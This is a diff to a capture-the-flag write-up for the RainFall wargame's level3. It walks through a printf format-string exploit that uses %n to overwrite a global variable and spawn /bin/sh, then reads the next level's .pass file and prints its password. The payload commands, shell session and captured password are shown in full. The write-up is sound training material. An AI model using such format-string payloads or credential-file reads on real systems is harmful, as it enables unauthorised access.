@@ -1,23 +1,55 @@
-0x080484ad      eax = dword [obj.stdin]                    ; obj.stdin__GLIBC_2.0 ; [0x8049860:4]=0
-0x080484b2      dword [nitems] = eax                       ; FILE *stream
-0x080484b6      dword [size] = 0x200                       ; [0x200:4]=-1 ; 512 ; int size
-0x080484be      eax = [format]
-0x080484c4      dword [esp] = eax                          ; char *s
-0x080484c7      sym.imp.fgets ()                           ; char *fgets(char *s, int size, FILE *stream)
-0x080484cc      eax = [format]
-0x080484d2      dword [esp] = eax                          ; const char *format
-0x080484d5      sym.imp.printf ()                          ; int printf(const char *format)
-0x080484da      eax = dword [obj.m]                        ; [0x804988c:4]=0
-0x080484df      var = eax - 0x40                           ; '@' ; 64
-0x080484e2      if (var) goto 0x8048518
+080484a4 <v>:
+ 80484a4:	55                   	push   ebp
+ 80484a5:	89 e5                	mov    ebp,esp
+ 80484a7:	81 ec 18 02 00 00    	sub    esp,0x218
+ 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860			 ;stdin
+ 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+ 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
+ 80484bd:	00 
+ 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
+ 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
+ 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
+ 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
+ 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c			; int32_t m variable on bss
+ 80484df:	83 f8 40             	cmp    eax,0x40
+ 80484e2:	75 34                	jne    8048518 <v+0x74>
+ 80484e4:	a1 80 98 04 08       	mov    eax,ds:0x8049880			;stdout
+ 80484e9:	89 c2                	mov    edx,eax
+ 80484eb:	b8 00 86 04 08       	mov    eax,0x8048600			; "Wait what?!\n"
+ 80484f0:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
+ 80484f4:	c7 44 24 08 0c 00 00 	mov    DWORD PTR [esp+0x8],0xc
+ 80484fb:	00 
+ 80484fc:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
+ 8048503:	00 
+ 8048504:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
+ 804850c:	c7 04 24 0d 86 04 08 	mov    DWORD PTR [esp],0x804860d ; "/bin/sh"
+ 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
+ 8048518:	c9                   	leave  
+ 8048519:	c3                   	ret    
 
 We can see that a fgets on stdin is done, the result is then used as a format string for printf.
-There is also a check on the value of stored at obj.m,
+There is also a check on the value of stored at m,
 which must be 64 (0x40) in order not to take the branch that directly leaves the function.
-So we can use a %n printf exploit to modify the value at obj.m and pass the check that will call /bin/sh for us.
+So we can use a %n printf exploit to modify the value at m and pass the check that will call /bin/sh for us.
 To exploit %n we first need to provide it a value, as printf is variadic and will pop arguments as required by the format.
 We need to pop the right amount of variable with some conversion (%p) until we hit the start of format (our string),
-at the beginning of which we put the address of obj.m.
-We then need to calculate the amount of chars left to print so that we can modify obj.m to the value we want.
-We need to pop 3 arguments from the stack until we hit our passed address of obj.m
-cat payload - | ./level3
+at the beginning of which we put the address of m.
+We then need to calculate the amount of chars left to print so that we can modify m to the value we want.
+We need to pop 3 arguments from the stack until we hit our passed address of m.
+In total, we need to print 64 chars before the %n conversion: 64 - 4 bytes for the address - 32 'A' chars = 28 chars left to print.
+And it just so happens that "%p %p %t " after that will print exactly 28 bytes :
+
+echo -ne '\x8c\x98\x04\x08' > /tmp/payload
+python -c 'import sys ; sys.stdout.write("A" * 32)' >> /tmp/payload
+echo '%p %p %p %n' >> /tmp/payload
+
+level3@RainFall:~$ cat /tmp/payload - | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x200 0xb7fd1ac0 0xb7ff37d0 
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
